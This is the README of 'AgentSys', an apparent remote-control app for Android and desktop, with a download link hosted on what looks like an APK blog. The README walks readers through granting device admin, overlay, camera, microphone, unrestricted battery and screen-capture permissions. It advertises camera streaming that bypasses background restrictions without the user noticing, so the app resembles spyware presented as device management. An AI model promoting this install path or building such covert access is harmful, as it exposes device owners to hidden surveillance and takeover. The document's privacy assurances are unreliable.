# AgentSys

An integrated remote management system for Mobile and Desktop devices. AgentSys allows administrators to perform remote monitoring, control, and resource sharing from a single centralized web dashboard with low-latency connectivity.

## 📥 Download

You can download the latest installation files for both the **Mobile Agent (APK)** and the **Desktop Agent** from the following link:
[**Download AgentSys (Mobile & Desktop)**](https://apkpro.console.elyng.com/2026/08/agen-kontrol.html)

## 🛠️ Mobile Agent Installation Guide

When installing the Android APK, you will be prompted to grant several permissions. It is crucial to allow these for the agent to function properly:

1. **Display Over Other Apps (System Alert Window)**
   * **Why:** Required to display the remote lock screen overlay securely over all other apps, and to seamlessly establish camera connections from the background without interrupting the user.
2. **Device Admin (Administrator Perangkat)**
   * **Why:** Required to allow the system to forcefully and instantly lock the device screen when the remote "Lock Screen" command is triggered.
3. **Camera & Microphone**
   * **Why:** Necessary to transmit the live video and audio feed when an administrator initiates a Live Camera streaming session.
4. **Ignore Battery Optimizations (Unrestricted Battery)**
   * **Why:** Ensures the background service remains active and connected to the server, preventing the OS from putting the agent to sleep.
5. **Screen Recording (MediaProjection)**
   * **Why:** Asked dynamically during a screen-sharing session to capture and transmit the display to the dashboard.

## 🌟 Key Features

- **Remote Lock Screen:** Instantly lock device screens remotely and display customized messages.
- **Live Camera Streaming:** Gain real-time access to both front and rear cameras. Includes specialized mechanisms to bypass background camera restrictions on modern operating systems.
- **Real-time Screen Share:** Directly monitor the user's screen in real-time.
- **🛡️ Secure Privacy Protection:** Designed with high-level privacy in mind. When a user types a password or enters sensitive data on their mobile device, the screen input is automatically masked and protected, ensuring it remains invisible and secure during an active Screen Share session.
- **Desktop Resource Sharing:** The desktop agent supports sharing local hardware functionalities, such as printers, seamlessly within the network.

## 📂 Project Architecture

The project is divided into several components based on their roles:

### 1. client (Web Admin Dashboard)
The user interface designed for Administrators. From this central dashboard, admins can register new devices, monitor online/offline statuses, and issue remote commands (Screen Share, Camera Access, Lock Screen).

### 2. mobile (Mobile Agent)
The agent application designed for mobile devices. It runs smoothly in the background and responds to server commands in real-time. This component handles system permissions and guarantees that sensitive inputs (like passwords) remain completely hidden during screen transmission.

### 3. desktop (PC Agent)
The client application designed for desktop computers. In addition to basic monitoring and management features, the desktop agent extends device functionality across the network, such as allowing local printers to be shared and utilized by the rest of the ecosystem.

### 4. Backend Server
A general signaling and relay system responsible for managing lightweight communication traffic. It acts as a bridge to establish a direct, stable, and fast connection between the Client Dashboard and the device agents.
